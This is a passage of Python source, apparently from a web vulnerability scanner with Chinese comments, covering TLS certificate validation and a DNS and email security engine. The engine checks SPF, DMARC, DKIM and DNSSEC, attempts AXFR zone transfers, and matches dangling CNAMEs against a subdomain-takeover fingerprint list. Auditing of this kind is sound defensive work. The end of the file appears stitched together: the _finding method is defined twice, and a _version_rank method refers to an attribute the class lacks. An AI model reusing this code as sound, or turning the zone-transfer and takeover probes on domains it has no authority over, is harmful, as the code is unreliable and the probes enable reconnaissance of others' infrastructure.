            severity, cvss = "Medium", 5.9
            desc = "证书绑定的域名与访问主机名不一致。"
            fix = "为实际访问域名签发包含正确 SAN 的证书。"
        else:
            ftype, title = "tls_cert_untrusted", "TLS 证书链校验失败（不受信任或不完整）"
            severity, cvss = "Medium", 5.9
            desc = ("证书链无法校验通过（缺少中间证书或根证书不受信任），"
                    "客户端会被拦截或被迫忽略证书校验。")
            fix = "补全中间证书链，使用受信任 CA 签发的证书。"
        findings.append(self._finding(
            url, ftype, title, severity, cvss, desc,
            f"{host}:{port} 证书校验失败: {chain_error}", fix,
        ))
        return findings

    async def _cert_info(self, host: str, port: int) -> Dict:
        """取回证书 DER 并解析出有效期 / 是否自签名 / SAN 列表。"""
        try:
            info = await asyncio.wait_for(
                self._handshake(host, port), timeout=self.CONNECT_TIMEOUT
            )
        except Exception:
            return {}
        return self._decode_cert(info.get("der") or b"")

    async def _chain_verify_error(self, host: str, port: int) -> Optional[str]:
        """用系统信任库做完整校验，返回错误描述；校验通过返回 None。"""
        try:
            await asyncio.wait_for(
                self._handshake(host, port, verify=True), timeout=self.CONNECT_TIMEOUT
            )
        except ssl.SSLCertVerificationError as exc:
            return str(getattr(exc, "verify_message", "") or exc)
        except Exception:
            return None
        return None

    @classmethod
    def _decode_cert(cls, der: bytes) -> Dict:
        """解析 DER 证书：优先 cryptography，其次内置最小 ASN.1 解析（均无则空）。"""
        if not der:
            return {}
        try:
            from cryptography import x509  # type: ignore

            cert = x509.load_der_x509_certificate(der)
            try:
                not_after = cert.not_valid_after_utc
            except AttributeError:  # cryptography < 42
                not_after = cert.not_valid_after
            try:
                san_ext = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
                sans = san_ext.value.get_values_for_type(x509.DNSName)
            except Exception:
                sans = []
            return {
                "not_after_ts": not_after.timestamp(),
                "not_after_text": not_after.strftime("%Y-%m-%d %H:%M:%S UTC"),
                "self_signed": cert.issuer == cert.subject,
                "sans": list(sans),
            }
        except Exception:
            logger.debug("suppressed exception (engine audit)")

        # 2) 纯标准库兜底：最小 ASN.1 解析提取有效期（无 cryptography 时仍能判断过期）
        not_after_ts = cls._der_extract_validity(der)
        if not_after_ts is None:
            return {}
        try:
            text = datetime.datetime.fromtimestamp(
                not_after_ts, datetime.timezone.utc
            ).strftime("%Y-%m-%d %H:%M:%S UTC")
        except Exception:
            text = ""
        return {
            "not_after_ts": not_after_ts,
            "not_after_text": text,
            "self_signed": False,
            "sans": [],
        }

    @staticmethod
    def _der_read_tlv(data: bytes, offset: int):
        """读取一个 ASN.1 TLV，返回 (tag, value, next_offset)。"""
        if offset + 2 > len(data):
            return None, b"", offset
        tag = data[offset]
        length = data[offset + 1]
        offset += 2
        if length & 0x80:  # 长格式长度
            nbytes = length & 0x7F
            if nbytes == 0 or offset + nbytes > len(data):
                return None, b"", offset
            length = int.from_bytes(data[offset:offset + nbytes], "big")
            offset += nbytes
        if offset + length > len(data):
            return None, b"", offset
        return tag, data[offset:offset + length], offset + length

    @staticmethod
    def _der_parse_time(raw: bytes) -> Optional[float]:
        """解析 ASN.1 UTCTime / GeneralizedTime 为 UTC 时间戳。"""
        try:
            text = raw.decode("ascii").strip()
        except Exception:
            return None
        if text.endswith("Z"):
            text = text[:-1]
        # 去掉结尾 Z 之后的长度：UTCTime=12(YYMMDDHHMMSS)，GeneralizedTime=14(YYYYMMDDHHMMSS)
        if len(text) == 12:
            fmt = "%y%m%d%H%M%S"
        elif len(text) == 14:
            fmt = "%Y%m%d%H%M%S"
        elif len(text) == 10:
            fmt = "%y%m%d"
        elif len(text) == 8:
            fmt = "%Y%m%d"
        else:
            return None
        try:
            dt = datetime.datetime.strptime(text, fmt).replace(tzinfo=datetime.timezone.utc)
            return dt.timestamp()
        except Exception:
            return None

    @classmethod
    def _der_extract_validity(cls, der: bytes) -> Optional[float]:
        """从 DER 证书提取 notAfter 时间戳（无第三方依赖的最小 ASN.1 解析）。

        tbsCertificate 顶层字段顺序：
          [0]version(可选) / serialNumber / signature(SEQ) / issuer(SEQ) /
          validity(SEQ) / subject(SEQ) ...
        其中 validity = SEQUENCE { notBefore, notAfter }
        """
        try:
            tag, cert_body, _ = cls._der_read_tlv(der, 0)
            if tag != 0x30:
                return None
            tag, tbs, _ = cls._der_read_tlv(cert_body, 0)
            if tag != 0x30:
                return None

            top_sequences: List[bytes] = []
            offset = 0
            while offset < len(tbs) and len(top_sequences) < 6:
                t, value, nxt = cls._der_read_tlv(tbs, offset)
                if t is None or nxt <= offset:
                    break
                if t == 0x30:
                    top_sequences.append(value)
                offset = nxt

            # top_sequences: [signature, issuer, validity, subject, ...]
            if len(top_sequences) < 3:
                return None

            times: List[Optional[float]] = []
            offset = 0
            while offset < len(top_sequences[2]):
                t, value, nxt = cls._der_read_tlv(top_sequences[2], offset)
                if t is None or nxt <= offset:
                    break
                if t in (0x17, 0x18):  # UTCTime / GeneralizedTime
                    times.append(cls._der_parse_time(value))
                offset = nxt

            if len(times) >= 2:
                return times[1]
        except Exception:
            return None
        return None

    @staticmethod
    def _host_matches(host: str, sans: List[str]) -> bool:
        """主机名与证书 SAN 匹配（支持通配证书，如 *.example.com）。"""
        host_l = (host or "").lower().rstrip(".")
        for name in sans:
            name_l = str(name).lower().rstrip(".")
            if name_l == host_l:
                return True
            if name_l.startswith("*.") and host_l.endswith(name_l[1:]):
                return True
        return False


# ============================================================
# DNS / 邮件安全检测引擎
# 说明：面向域名资产的目标级全局引擎（由 V100 global_scan 调度）。
# 检测面：
#   1. 邮件安全：SPF / DMARC / DKIM 记录缺失或策略过宽（可被邮件伪造、钓鱼）
#   2. DNS 区域传送（AXFR）未受限导致整域记录泄露
#   3. 子域名接管（CNAME 指向云服务但资源已释放）
#   4. DNSSEC 未启用
# 依赖：dnspython（可选）；阻塞 DNS 调用统一放入线程池，避免阻塞事件循环。
# ============================================================


class DnsSecurityEngine(BaseEngine):
    """DNS 与邮件安全检测引擎"""

    name = "dns_security"
    description = "DNS/邮件安全检测（SPF/DKIM/DMARC、AXFR 区域传送、子域名接管、DNSSEC）"

    DNS_TIMEOUT = 5
    HTTP_TIMEOUT = 6
    MAX_NS = 4
    DNS_CONCURRENCY = 10

    # 常见 DKIM 选择器（命中任一即认为已配置 DKIM）
    DKIM_SELECTORS = ("default", "selector1", "selector2", "google")

    # 子域名接管： (CNAME 关键字, 接管后页面指纹, 服务名)
    TAKEOVER_FINGERPRINTS = (
        ("github.io", ("There isn't a GitHub Pages site here",), "GitHub Pages"),
        ("herokuapp.com", ("No such app", "There's nothing here, yet"), "Heroku"),
        ("s3.amazonaws.com", ("NoSuchBucket", "The specified bucket does not exist"), "AWS S3"),
        ("azurewebsites.net", ("Error 404 - Web app not found",), "Azure App Service"),
        ("netlify.app", ("Not Found - Request ID",), "Netlify"),
        ("vercel.app", ("The deployment could not be found", "404: NOT_FOUND"), "Vercel"),
        ("pantheonsite.io", ("404 error unknown site",), "Pantheon"),
        ("zendesk.com", ("Help Center Closed",), "Zendesk"),
        ("readme.io", ("Project doesnt exist",), "Readme.io"),
        ("ghost.io", ("The thing you were looking for is no longer here",), "Ghost"),
        ("shopify.com", ("Sorry, this shop is currently unavailable",), "Shopify"),
        ("fastly.net", ("Fastly error: unknown domain",), "Fastly"),
        ("unbouncepages.com", ("The requested URL was not found on this server",), "Unbounce"),
        ("surge.sh", ("project not found",), "Surge.sh"),
        ("bitbucket.io", ("Repository not found",), "Bitbucket"),
        ("tumblr.com", ("There's nothing here",), "Tumblr"),
        ("teamwork.com", ("Oops - We didn't find your site",), "Teamwork"),
        ("helpjuice.com", ("We could not find what you're looking for",), "Helpjuice"),
        ("helpscoutdocs.com", ("No settings were found for this company",), "HelpScout"),
        ("uservoice.com", ("This UserVoice subdomain is currently available",), "UserVoice"),
        ("feedpress.me", ("The feed has not been found",), "FeedPress"),
    )

    TAKEOVER_PREFIXES = (
        "www", "mail", "blog", "shop", "api", "docs", "status", "help",
        "cdn", "assets", "static", "dev", "test", "staging", "portal",
        "support", "forum", "community", "careers", "app", "admin",
        "img", "media", "download", "kb", "store", "beta", "demo",
        "m", "mobile", "secure", "git", "ci", "wiki",
    )

    # 常见二级后缀（用于基域提取）
    MULTI_LEVEL_SUFFIXES = {
        "com.cn", "net.cn", "org.cn", "gov.cn", "edu.cn", "com.hk",
        "co.uk", "org.uk", "com.tw", "co.jp", "com.au", "co.kr", "com.br",
    }

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        """参数级入口：DNS/邮件配置与 URL 参数无关，统一走 scan() 全局扫描。"""
        return None

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        """扫描域名资产的 DNS 与邮件安全配置。"""
        findings: List[Dict] = []
        domain = self._base_domain(target)
        if not domain:
            return findings
        if not DNS_AVAILABLE:
            logger.info("DNS/邮件安全检测跳过：未安装 dnspython")
            return findings

        findings.extend(await self._check_email_security(domain))
        findings.extend(await self._check_zone_transfer(domain))
        findings.extend(await self._check_dnssec(domain))
        findings.extend(await self._check_subdomain_takeover(domain, session))

        logger.info(f"DNS/邮件安全检测完成：{domain}，发现 {len(findings)} 个问题")
        return findings

    # ---------- 邮件安全 ----------

    async def _check_email_security(self, domain: str) -> List[Dict]:
        findings: List[Dict] = []
        txts = await self._txt_records(domain)
        if txts is None:  # DNS 查询整体失败（无可用解析器）时不做缺失判定
            return findings

        spf = [t for t in txts if t.strip().lower().startswith("v=spf1")]
        if not spf:
            findings.append(self._finding(
                domain, "email_spf_missing", "邮件安全：缺少 SPF 记录", "Medium", 5.3,
                "域名未配置 SPF，攻击者可伪造该域发件人发起钓鱼/欺诈邮件。",
                f"{domain} 的 TXT 记录中未找到 v=spf1 记录",
                "添加 SPF 记录，例如 v=spf1 include:_spf.example.com -all。",
            ))
        else:
            record = spf[0].lower()
            if re.search(r"\+all|(\?\s*all)", record) or record.rstrip().endswith("+all"):
                findings.append(self._finding(
                    domain, "email_spf_permissive", "邮件安全：SPF 策略过宽", "Medium", 5.3,
                    "SPF 记录使用 +all/?all，等同于允许任意主机以该域名义发信，失去防伪造作用。",
                    f"SPF 记录: {spf[0][:200]}",
                    "将 SPF 结尾改为 -all（硬失败）或 ~all（软失败）。",
                ))

        dmarc_txts = await self._txt_records(f"_dmarc.{domain}")
        dmarc = [t for t in (dmarc_txts or []) if t.strip().lower().startswith("v=dmarc1")]
        if dmarc_txts is not None and not dmarc:
            findings.append(self._finding(
                domain, "email_dmarc_missing", "邮件安全：缺少 DMARC 记录", "Medium", 5.3,
                "未配置 DMARC，收件方无法按域策略处置伪造邮件，品牌易被用于钓鱼。",
                f"_dmarc.{domain} 未返回 v=DMARC1 记录",
                "添加 DMARC 记录，例如 v=DMARC1; p=quarantine; rua=mailto:dmarc@example.com。",
            ))
        elif dmarc:
            policy = re.search(r"\bp\s*=\s*(\w+)", dmarc[0].lower())
            if policy and policy.group(1) == "none":
                findings.append(self._finding(
                    domain, "email_dmarc_none", "邮件安全：DMARC 策略为 p=none", "Low", 3.1,
                    "DMARC 仅处于监控模式（p=none），不会拦截或隔离伪造邮件。",
                    f"DMARC 记录: {dmarc[0][:200]}",
                    "在监控稳定后将策略提升为 p=quarantine 或 p=reject。",
                ))

        dkim_found = False
        dkim_results = await asyncio.gather(
            *[self._txt_records(f"{sel}._domainkey.{domain}") for sel in self.DKIM_SELECTORS]
        )
        for records in dkim_results:
            if records and any("v=dkim1" in r.lower() or "k=rsa" in r.lower() for r in records):
                dkim_found = True
                break
        if not dkim_found and any(r is not None for r in dkim_results):
            findings.append(self._finding(
                domain, "email_dkim_missing", "邮件安全：未发现 DKIM 记录", "Low", 3.1,
                f"常见 DKIM 选择器（{', '.join(self.DKIM_SELECTORS)}）均未返回密钥记录，"
                f"邮件缺少签名校验（如使用第三方邮件服务请以其实际选择器为准）。",
                f"{domain} 的常见 _domainkey 选择器无 DKIM 记录",
                "为外发邮件启用 DKIM 签名并发布公钥 TXT 记录。",
            ))
        return findings

    # ---------- 区域传送 ----------

    async def _check_zone_transfer(self, domain: str) -> List[Dict]:
        try:
            ns_answer = await self._dns_query(
                dns.resolver.resolve, domain, "NS", lifetime=self.DNS_TIMEOUT
            )
            nameservers = [str(rdata.target).rstrip(".") for rdata in ns_answer]
        except Exception:
            return []

        for ns in nameservers[: self.MAX_NS]:
            try:
                zone = await self._dns_query(
                    dns.zone.from_xfr,
                    dns.query.xfr(ns, domain, lifetime=self.DNS_TIMEOUT, timeout=self.DNS_TIMEOUT),
                )
                if zone is not None:
                    count = len(zone.nodes.keys())
                    return [self._finding(
                        domain, "dns_zone_transfer", "DNS 区域传送（AXFR）未受限", "High", 7.5,
                        "任意主机可从 authoritative DNS 服务器同步完整区域数据，"
                        "直接泄露内网主机名、子域与主机用途。",
                        f"名称服务器 {ns} 允许 AXFR 查询，返回 {count} 条记录",
                        "在 DNS 服务器上限制 AXFR 仅允许从服务器 IP（allow-transfer）。",
                    )]
            except Exception:
                continue
        return []

    # ---------- DNSSEC ----------

    async def _check_dnssec(self, domain: str) -> List[Dict]:
        try:
            await self._dns_query(
                dns.resolver.resolve, domain, "DS", lifetime=self.DNS_TIMEOUT
            )
            return []
        except dns.resolver.NoAnswer:
            return [self._finding(
                domain, "dns_dnssec_missing", "域名未启用 DNSSEC", "Low", 3.1,
                "域名缺少 DS 记录，DNS 应答可被缓存投毒/劫持且无法校验来源。",
                f"{domain} 无 DS 记录（DNSSEC 未启用）",
                "在域名注册商与 DNS 服务商处启用 DNSSEC 并发布 DS 记录。",
            )]
        except Exception:
            return []

    # ---------- 子域名接管 ----------

    async def _check_subdomain_takeover(self, domain: str, session) -> List[Dict]:
        semaphore = asyncio.Semaphore(self.DNS_CONCURRENCY)

        async def resolve(prefix: str):
            async with semaphore:
                return prefix, await self._cname(f"{prefix}.{domain}")

        pairs = await asyncio.gather(*[resolve(p) for p in self.TAKEOVER_PREFIXES])
        findings: List[Dict] = []
        for prefix, cname in pairs:
            if not cname:
                continue
            service = self._match_service(cname)
            if not service:
                continue
            host = f"{prefix}.{domain}"
            body = await self._http_text(f"http://{host}", session)
            if not body:
                continue
            for fingerprint in self._fingerprints_for(cname):
                if fingerprint.lower() in body.lower():
                    findings.append(self._finding(
                        f"http://{host}", "subdomain_takeover",
                        f"子域名接管风险：{host}（{service}）", "High", 8.1,
                        f"{host} 的 CNAME 指向 {cname}，但对应 {service} 资源已释放，"
                        f"攻击者可注册同名资源接管该子域并发布恶意内容。",
                        f"CNAME: {host} -> {cname}；页面命中接管指纹: {fingerprint}",
                        "删除悬空 CNAME 记录，或重新claim对应云服务资源。",
                    ))
                    break
        return findings

    # ---------- 内部实现 ----------

    @staticmethod
    def _base_domain(target: str) -> str:
        """提取基域（去 www、支持常见多级后缀）；IP 或非域名返回空。"""
        raw = (target or "").strip()
        if not raw:
            return ""
        if "://" not in raw:
            raw = "https://" + raw
        host = (urlparse(raw).hostname or "").lower().rstrip(".")
        if not host:
            return ""
        if re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", host):  # 纯 IP 无域名类检测
            return ""
        if host.startswith("www."):
            host = host[4:]
        parts = host.split(".")
        if len(parts) <= 2:
            return host
        if ".".join(parts[-2:]) in DnsSecurityEngine.MULTI_LEVEL_SUFFIXES and len(parts) >= 3:
            return ".".join(parts[-3:])
        return ".".join(parts[-2:])

    async def _dns_query(self, func, *args, **kwargs):
        """把阻塞的 dnspython 调用放入线程池，避免阻塞 asyncio 事件循环。"""
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, lambda: func(*args, **kwargs))

    async def _txt_records(self, name: str) -> Optional[List[str]]:
        """查询 TXT 记录；返回 None 表示查询失败（区别于“记录不存在”）。"""
        try:
            answer = await self._dns_query(
                dns.resolver.resolve, name, "TXT", lifetime=self.DNS_TIMEOUT
            )
            records = []
            for rdata in answer:
                records.append("".join(
                    part.decode("utf-8", "ignore") if isinstance(part, bytes) else str(part)
                    for part in rdata.strings
                ))
            return records
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
            return []
        except Exception:
            return None

    async def _cname(self, host: str) -> Optional[str]:
        try:
            answer = await self._dns_query(
                dns.resolver.resolve, host, "CNAME", lifetime=self.DNS_TIMEOUT
            )
            for rdata in answer:
                return str(rdata.target).rstrip(".")
        except Exception:
            return None
        return None

    async def _http_text(self, url: str, session) -> str:
        try:
            resp = await async_get(url, session=session, timeout=self.HTTP_TIMEOUT, no_retry=True)
            if isinstance(resp, tuple):
                return resp[1] or ""
            return (await resp.text()) or ""
        except Exception:
            return ""

    def _match_service(self, cname: str) -> str:
        lowered = (cname or "").lower()
        for key, _fingerprints, service in self.TAKEOVER_FINGERPRINTS:
            if key in lowered:
                return service
        return ""

    def _fingerprints_for(self, cname: str):
        lowered = (cname or "").lower()
        for key, fingerprints, _service in self.TAKEOVER_FINGERPRINTS:
            if key in lowered:
                return fingerprints
        return ()

    @staticmethod
    def _finding(
        url: str,
        ftype: str,
        title: str,
        severity: str,
        cvss: float,
        description: str,
        evidence: str,
        remediation: str,
    ) -> Dict:
        return {
            "url": url,
            "type": ftype,
            "severity": severity,
            "title": title,
            "description": description,
            "remediation": remediation,
            "recommendation": remediation,
            "parameter": "",
            "method": "GET",
            "evidence": evidence,
            "confidence": "high",
            "cvss": cvss,
        }

    @classmethod
    def _version_rank(cls, version: str) -> int:
        return cls._VERSION_RANK.get(str(version).strip(), -1)

    @staticmethod
    def _finding(
        url: str,
        ftype: str,
        title: str,
        severity: str,
        cvss: float,
        description: str,
        evidence: str,
        remediation: str,
    ) -> Dict:
        return {
            "url": url,
            "type": ftype,
            "severity": severity,
            "title": title,
            "description": description,
            "remediation": remediation,
            "recommendation": remediation,
            "parameter": "",
            "method": "GET",
            "evidence": evidence,
            "confidence": "high",
            "cvss": cvss,
        }
